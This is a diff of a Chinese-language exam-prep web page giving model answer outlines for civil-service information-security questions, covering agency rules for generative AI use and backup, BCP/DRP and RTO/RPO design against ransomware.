+          <tr><td>區分<strong>公開服務</strong>與<strong>機關自建／專屬環境</strong>之使用限制</td></tr>
+          <tr><td>指定<strong>允許使用的工具清單</strong>，避免各自使用來路不明的服務</td></tr>
+          <tr><td rowspan="3"><strong>② 資料管控（核心）</strong></td><td><strong>嚴禁將個人資料、機密文件、系統帳密貼入公開 AI 服務</strong>——最重要的一條</td></tr>
+          <tr><td>必要時應<strong>先去識別化</strong>再使用</td></tr>
+          <tr><td>敏感業務應建置<strong>機關內部或封閉環境之 AI 服務</strong>，確保資料不外流</td></tr>
+          <tr><td rowspan="3"><strong>③ 輸出查核</strong></td><td><strong>AI 產出一律視為「初稿」，必須經人工查核後始得使用</strong></td></tr>
+          <tr><td><strong>引用之法規、數據、案例必須逐一查證</strong>（防幻覺）</td></tr>
+          <tr><td>對外發布之內容<strong>依規定標示</strong>是否使用 AI 生成</td></tr>
+          <tr><td rowspan="2"><strong>④ 責任歸屬</strong></td><td><strong>承辦人與核稿主管仍負完全責任</strong>——<u>不得以「AI 產生的」作為卸責理由</u></td></tr>
+          <tr><td><strong>行政決定不得完全交由 AI 作成</strong>；AI 僅為輔助，須保留人工判斷與說明理由之能力</td></tr>
+          <tr><td rowspan="2"><strong>⑤ 採購與委外</strong></td><td>契約明定<strong>資料不得用於模型訓練</strong>、資料留存與刪除、資料所在地</td></tr>
+          <tr><td>評估業者之<strong>資安認證、服務延續性與退場機制</strong></td></tr>
+          <tr><td rowspan="2"><strong>⑥ 教育訓練</strong></td><td>說明 AI 的<strong>能力與限制</strong>（特別是幻覺）；深偽與新型社交工程之辨識</td></tr>
+          <tr><td>建立<strong>諮詢與通報窗口</strong>；定期更新規範</td></tr>
+          <tr><td rowspan="2"><strong>⑦ 配套控管</strong></td><td>關鍵作業（<strong>變更匯款帳號、人事異動</strong>）採<strong>雙人覆核</strong>與<strong>另一管道回撥確認</strong>——因應深偽</td></tr>
+          <tr><td>資安防護由特徵碼式轉向<strong>行為式偵測（EDR）</strong>；強化<strong>出向流量管控</strong></td></tr>
+        </table></div>
+        <div class="hl">
+          <strong>結論句</strong>：機關對生成式 AI 宜採<strong>「明確規範、審慎試辦、逐步擴大」</strong>的策略——<u>一味禁止會使同仁私下使用而更難管控</u>；<strong>應提供合規的工具與清楚的界線</strong>，讓同仁知道「可以用什麼、不能放什麼」。
+        </div>
+
+        <div class="hl"><span class="t">✍️ 必寫拿分點</span>
+        1. 新型威脅要寫<strong>「深偽使『聽到本人聲音』不再可靠」</strong>與<strong>「員工把公務資料貼進公開 AI」</strong>——後者是機關最真實的風險<br>
+        2. 指出<strong>「傳統以語句不通順辨識釣魚信的教學已失效」</strong><br>
+        3. AI 自身風險<strong>務必寫「提示詞注入」與「幻覺」</strong>；提示詞注入要說明<u>外部文件也是攻擊面</u><br>
+        4. 管理規範的核心是<strong>「嚴禁將個資與機密貼入公開服務」</strong>與<strong>「產出一律視為初稿，須人工查核」</strong><br>
+        5. <strong>「承辦人仍負完全責任，不得以 AI 卸責」</strong>、<strong>「行政決定不得完全交由 AI 作成」</strong>——法制面加分句<br>
+        6. 契約要寫<strong>「資料不得用於模型訓練」</strong><br>
+        7. 結論用<strong>「明確規範、審慎試辦、逐步擴大」</strong>並說明<u>一味禁止反而更難管控</u>——展現務實判斷
+        </div>
       </div>
     </details>
   </div>
@@ -1616,53 +2034,94 @@
     </div>
     <details><summary>看答題架構</summary>
       <div class="ans">
-        <div class="frame"><span class="t">建議結構</span>
-        <strong>一、BCP、DRP 與 RTO／RPO</strong><br>
-        　（一）<strong>BCP（營運持續計畫）</strong>：確保<strong>整體業務</strong>於中斷事件後仍能持續或迅速恢復，範圍包含人員、場地、流程、供應鏈，<u>不限於 IT</u><br>
-        　（二）<strong>DRP（災難復原計畫）</strong>：聚焦 <strong>IT 系統與資料</strong>之復原程序，為 BCP 之一部分<br>
-        　（三）<strong>BIA（營運衝擊分析）</strong>：盤點關鍵業務、評估中斷之衝擊與可容忍中斷時間，作為訂定 RTO／RPO 之依據<br>
-        　（四）<strong>RTO</strong>：可容忍之<strong>停機時間</strong>上限 → 決定<strong>備援架構</strong>（熱／溫／冷備援）<br>
-        　（五）<strong>RPO</strong>：可容忍之<strong>資料遺失量</strong>上限 → 決定<strong>備份／日誌傳送頻率</strong><br>
-        　（六）以時間軸圖說明：<strong>RPO 看事件發生點往前遺失多少資料；RTO 看事件發生點往後多久恢復服務</strong>（畫圖加分）<br><br>
-        <strong>二、備份策略</strong><br>
-        　（一）三種備份類型比較表：<br>
-        <div class="table-wrap"><table>
-          <tr><th>類型</th><th>備份內容</th><th>備份時間</th><th>空間</th><th>復原步驟</th></tr>
-          <tr><td>完整</td><td>全部資料</td><td>最長</td><td>最大</td><td>最簡單、<strong>最快</strong></td></tr>
-          <tr><td>差異</td><td>自上次<strong>完整</strong>備份後之變更</td><td>中</td><td>中</td><td>完整 ＋ <strong>最後一次</strong>差異</td></tr>
-          <tr><td>增量</td><td>自上次<strong>任何</strong>備份後之變更</td><td><strong>最短</strong></td><td>最小</td><td>完整 ＋ <strong>所有</strong>增量（最慢）</td></tr>
-        </table></div>
-        　（二）<strong>3-2-1 原則</strong>：至少 <strong>3</strong> 份副本、存於 <strong>2</strong> 種不同媒體、其中 <strong>1</strong> 份<strong>異地</strong>存放<br>
-        　（三）延伸為 <strong>3-2-1-1-0</strong>：再加 <strong>1 份離線／不可變（Immutable）</strong>備份，且還原測試錯誤數為 <strong>0</strong><br>
-        　（四）其他要點：備份<strong>加密</strong>（避免備份成為外洩管道）、備份媒體之實體安全、保存期限與輪替（如祖父—父—子輪替制）<br><br>
-        <strong>三、架構建議（RTO ≤ 4h、RPO ≤ 30min、須抗勒索）</strong><br>
-        　（一）<strong>達成 RPO ≤ 30 分鐘</strong>：<br>
-        　　　1. 資料庫<strong>交易日誌每 15 分鐘備份</strong>並傳送異地（留安全餘裕）<br>
-        　　　2. 或採<strong>非同步複寫</strong>至備援站，可使 RPO 逼近數分鐘<br>
-        　　　3. 每日完整備份 ＋ 每數小時差異備份<br>
-        　（二）<strong>達成 RTO ≤ 4 小時</strong>：<br>
-        　　　1. 建置<strong>溫備援或熱備援</strong>站台，預先部署系統環境<br>
-        　　　2. 虛擬化叢集 ＋ 高可用（HA），單機故障可自動切換<br>
-        　　　3. 制定明確的<strong>切換決策程序</strong>（誰有權決定切換、判斷準則），避免決策延誤耗掉復原時間<br>
-        　　　4. 若採冷備援，4 小時內完成大型系統還原風險偏高，<strong>不建議</strong><br>
-        　（三）<strong>因應勒索軟體（本題重點）</strong>：<br>
-        　　　1. <strong>離線備份（Air-gapped）</strong>：磁帶或定期離線之儲存設備，實體隔離使惡意程式無法觸及<br>
-        　　　2. <strong>不可變備份（Immutable / WORM）</strong>：設定保留期間內<strong>不可刪除或修改</strong>，即使管理員帳號遭盜用亦然<br>
-        　　　3. <strong>備份系統帳號與網域分離</strong>：勒索軟體常先取得網域管理員權限再刪除備份 → 備份系統應獨立驗證、獨立網段<br>
-        　　　4. <strong>多版本保留</strong>：因惡意程式可能潛伏數週，僅保留最新備份可能已受污染 → 須保留足夠的歷史版本<br>
-        　　　5. <strong>還原前掃描</strong>：確認備份本身乾淨後才還原，避免二次感染<br>
-        　（四）<strong>管理配套（不可省略）</strong>：<br>
-        　　　1. <strong>定期演練還原</strong>並記錄結果——「備份成功」不等於「還原成功」<br>
-        　　　2. 演練應包含<strong>實際切換</strong>至備援站，而非僅紙上作業<br>
-        　　　3. 訂定 BCP／DRP 並依《<strong>資通安全管理法</strong>》定期辦理演練<br>
-        　　　4. 建立備份監控與告警（備份失敗須有人知道並處理）<br>
-        　　　5. 異地備援站應位於<strong>不同地理區域</strong>，以因應區域性災害<br><br>
-        <strong>四、結論</strong>：RTO 與 RPO 為備援設計之量化依據，兩者分別由<strong>備援架構</strong>與<strong>備份頻率</strong>決定。面對勒索軟體，<strong>離線與不可變備份是最後一道防線</strong>；而所有設計都必須以<strong>定期實際演練</strong>驗證其有效性，否則僅存在於文件之中。
+        <div class="frame"><span class="t">📋 答題骨架</span>
+        一、BCP vs DRP（表）＋ RTO／RPO 定義圖 → 二、備份類型（表）＋3-2-1 原則 → 三、<u>逐一回應兩個數字＋勒索軟體專屬對策</u>
         </div>
-        <strong>💡 拿分關鍵</strong>：第三小題必須<strong>把 RTO 與 RPO 分開回應</strong>（架構 vs 頻率），並且<strong>針對勒索軟體單獨處理</strong>——「離線／不可變備份」「備份帳號與網域分離」「多版本保留」這三點是本題的核心得分處。
+
+        <strong>📊 一、BCP 與 DRP</strong>
+        <div class="table-wrap"><table>
+          <tr><th>比較點</th><th>BCP（營運持續計畫）</th><th>DRP（災害復原計畫）</th></tr>
+          <tr><td>全名</td><td>Business Continuity Plan</td><td>Disaster Recovery Plan</td></tr>
+          <tr><td><strong>範圍</strong></td><td><strong>整個機關的營運</strong>（人員、場所、流程、供應商、對外溝通）</td><td><strong>資訊系統與資料的復原</strong></td></tr>
+          <tr><td><strong>目的</strong></td><td><strong>維持關鍵業務不中斷</strong>（可用替代方式）</td><td><strong>把系統救回來</strong></td></tr>
+          <tr><td>時間軸</td><td>涵蓋<strong>事發前、中、後全程</strong></td><td>著重<strong>事發後的復原</strong></td></tr>
+          <tr><td>負責層級</td><td>機關首長與各業務單位</td><td>資訊單位為主</td></tr>
+          <tr><td>關係</td><td colspan="2"><strong>DRP 是 BCP 的一部分</strong>；BCP 涵蓋 DRP</td></tr>
+          <tr><td>例子</td><td>系統全斷時<strong>改以紙本受理民眾申請</strong>；人員疏散與替代辦公場所</td><td>由備份還原資料庫；切換至備援機房</td></tr>
+        </table></div>
+        <p style="font-size:.88rem"><strong>前置作業</strong>：兩者皆應以<strong>業務衝擊分析（BIA）</strong>為基礎——先辨識<strong>關鍵業務</strong>與<strong>可容忍中斷時間</strong>，才能合理設定 RTO／RPO 並分配資源。</p>
+        <pre>                        ← RPO →│← ─── RTO ─── →
+   ────┬──────────┬───────────┼──────────────┬────► 時間
+       │          │           │              │
+   最後一次     資料仍       【故障】      服務恢復
+   可用備份     持續產生      發生            正常
+
+   RPO：可容忍的【資料遺失量】 ← 往回看，靠「備份／複寫頻率」決定
+   RTO：可容忍的【停機時間】   ← 往前看，靠「備援架構」決定</pre>
+        <div class="table-wrap"><table>
+          <tr><th>指標</th><th>定義</th><th>白話</th><th>由什麼決定</th></tr>
+          <tr><td><strong>RTO</strong></td><td>Recovery Time Objective——自故障發生至服務恢復可容忍之<strong>最長時間</strong></td><td><strong>多久要修好</strong></td><td><strong>備援架構</strong>、還原速度、演練熟練度</td></tr>
+          <tr><td><strong>RPO</strong></td><td>Recovery Point Objective——可容忍之<strong>最大資料遺失量</strong>（以時間表示）</td><td><strong>能掉多久的資料</strong></td><td><strong>備份／日誌傳送頻率</strong></td></tr>
+        </table></div>
+
+        <strong>📊 二、備份策略與 3-2-1 原則</strong>
+        <div class="table-wrap"><table>
+          <tr><th>類型</th><th>備份內容</th><th>備份時間</th><th>空間</th><th>還原步驟</th><th>還原時間</th></tr>
+          <tr><td><strong>完整備份</strong></td><td>全部資料</td><td>最長</td><td>最大</td><td><strong>1 份</strong></td><td><strong>最短</strong></td></tr>
+          <tr><td><strong>差異備份</strong></td><td>自<u>上次<strong>完整</strong>備份</u>以來之異動</td><td>中（逐日變長）</td><td>中</td><td><strong>2 份</strong>（完整＋最近一次差異）</td><td>中</td></tr>
+          <tr><td><strong>增量備份</strong></td><td>自<u>上次<strong>任何</strong>備份</u>以來之異動</td><td><strong>最短</strong></td><td><strong>最小</strong></td><td><strong>完整＋全部增量</strong></td><td><strong>最長</strong>（<u>任一份損毀即斷鏈</u>）</td></tr>
+        </table></div>
+        <div class="frame">
+          <span class="t">📐 3-2-1 原則</span>
+          <strong>3</strong> 份副本（1 份正式 + 2 份備份）<br>
+          <strong>2</strong> 種不同的儲存媒體（避免同一批媒體同時故障）<br>
+          <strong>1</strong> 份存放於<strong>異地</strong>（因應火災、水災、機房整體毀損）<br><br>
+          <strong>現代延伸：3-2-1-1-0</strong><br>
+          再加 <strong>1</strong> 份<strong>離線或不可變（Immutable）</strong>副本 ← <u>因應勒索軟體</u><br>
+          <strong>0</strong> 個還原錯誤 ← <u>必須經過驗證</u>
+        </div>
+        <div class="table-wrap"><table>
+          <tr><th>其他要點</th><th>說明</th></tr>
+          <tr><td>多版本保留</td><td>惡意程式可能<strong>潛伏數週</strong>，只留最近一版可能已被污染 → 須保留<strong>多個時間點</strong>（日／週／月）</td></tr>
+          <tr><td>備份加密</td><td>備份媒體含個資，遺失即等同外洩 → <strong>應加密並管控存取</strong></td></tr>
+          <tr><td><strong>定期還原演練</strong></td><td><strong>「備份成功」不等於「還原成功」</strong>——須定期實際還原並<strong>計時</strong>，驗證是否符合 RTO</td></tr>
+        </table></div>
+
+        <strong>📊 三、本案架構建議（RTO ≤ 4 小時、RPO ≤ 30 分鐘、須防勒索）</strong>
+        <div class="table-wrap"><table>
+          <tr><th>要求</th><th>推論</th><th>對應作法</th></tr>
+          <tr><td><strong>RPO ≤ 30 分鐘</strong></td><td>資料最多只能掉 30 分鐘 → <strong>每日備份完全不夠</strong></td><td><strong>交易日誌每 15～30 分鐘備份／傳送</strong>；或採<strong>非同步複寫</strong>至備援站</td></tr>
+          <tr><td><strong>RTO ≤ 4 小時</strong></td><td>4 小時內須恢復服務 → <strong>從備份完整還原大型系統可能來不及</strong></td><td>建置<strong>熱備援（Standby）系統</strong>可快速切換；<strong>預先撰寫並演練切換程序</strong></td></tr>
+          <tr><td><strong>防勒索軟體</strong></td><td>勒索軟體會<strong>主動搜尋並加密網路上的備份</strong>，取得網域管理員後甚至先刪除備份</td><td>見下方專屬對策</td></tr>
+        </table></div>
+        <div class="table-wrap"><table>
+          <tr><th>層次</th><th>建議架構</th></tr>
+          <tr><td><strong>備份排程</strong></td><td><strong>每週完整備份 ＋ 每日差異備份 ＋ 交易日誌每 30 分鐘</strong><br><u>選差異而非增量，以縮短還原步驟數（顧 RTO）</u></td></tr>
+          <tr><td><strong>高可用（顧 RTO）</strong></td><td>同機房<strong>叢集或同步複寫</strong>，單機故障可自動切換（分鐘級）</td></tr>
+          <tr><td><strong>異地備援</strong></td><td>另一機房建置<strong>非同步複寫</strong>之待命系統，因應機房級災害</td></tr>
+          <tr><td><strong>勒索軟體專屬對策</strong></td><td>① <strong>離線備份（Air-gapped）</strong>——實體離線，勒索軟體構不到<br>② <strong>不可變備份（Immutable／WORM）</strong>——保存期內<u>連管理員也無法刪改</u><br>③ <strong>備份系統帳號與網域分離</strong>——網域管理員遭竊也動不了備份<br>④ <strong>多版本保留</strong>——因應潛伏期<br>⑤ <strong>還原前先掃描</strong>，確認備份時點乾淨<br>⑥ 備份伺服器<strong>網段隔離</strong>，僅開放必要通訊</td></tr>
+          <tr><td><strong>驗證機制</strong></td><td>每次備份後<strong>自動驗證完整性</strong>；<strong>每季實際還原演練並計時</strong>，確認符合 RTO/RPO；記錄演練結果與改善事項</td></tr>
+          <tr><td><strong>制度面</strong></td><td>納入 <strong>BCP／DRP</strong>；明訂<strong>切換決策權責</strong>（誰有權宣告啟動）；<strong>對外公告替代作業方式</strong>；依《資通安全管理法》辦理演練與檢討</td></tr>
+          <tr><td>預防面</td><td>備份是<strong>最後一道防線</strong>，前面仍須：修補管理、<strong>MFA</strong>、網段隔離、<strong>EDR</strong>、郵件防護、<strong>使用者非管理員權限</strong></td></tr>
+        </table></div>
+        <div class="warn"><span class="t">⚠️ 本題最關鍵的一句</span>
+        <strong>「備份必須有離線或不可變副本，否則勒索軟體會連備份一起加密。」</strong><br>
+        這是實務上機關遭勒索後<u>無法還原</u>的最主要原因——備份一直掛在網路上。</div>
+
+        <div class="hl"><span class="t">✍️ 必寫拿分點</span>
+        1. BCP／DRP 的核心差異：<strong>BCP 是「業務不中斷」、DRP 是「系統救回來」，DRP 屬於 BCP 的一部分</strong><br>
+        2. 舉出 BCP 的<strong>非資訊面例子</strong>（改以紙本受理）——顯示真的理解<br>
+        3. <strong>RTO／RPO 最好畫時間軸圖</strong>，並寫<strong>「RPO 靠備份頻率、RTO 靠備援架構」</strong><br>
+        4. 備份比較表<strong>務必含「還原步驟數」</strong>——這才是選差異或增量的實務判準<br>
+        5. 3-2-1 要展開解釋，並補<strong>3-2-1-1-0</strong> 的現代延伸<br>
+        6. 第三小題<strong>必須逐一回應兩個數字</strong>，寫出「每日備份不夠 → 日誌 30 分鐘」「完整還原來不及 → 熱備援」<br>
+        7. 勒索對策<strong>「離線／不可變備份」「備份帳號與網域分離」「還原前先掃描」</strong>三句必寫<br>
+        8. 結尾補<strong>「備份是最後一道防線，前面的預防仍不可省」</strong>
+        </div>
       </div>
     </details>
   </div>
+
 
   <div class="card">
     <h2>📊 練習進度追蹤</h2>
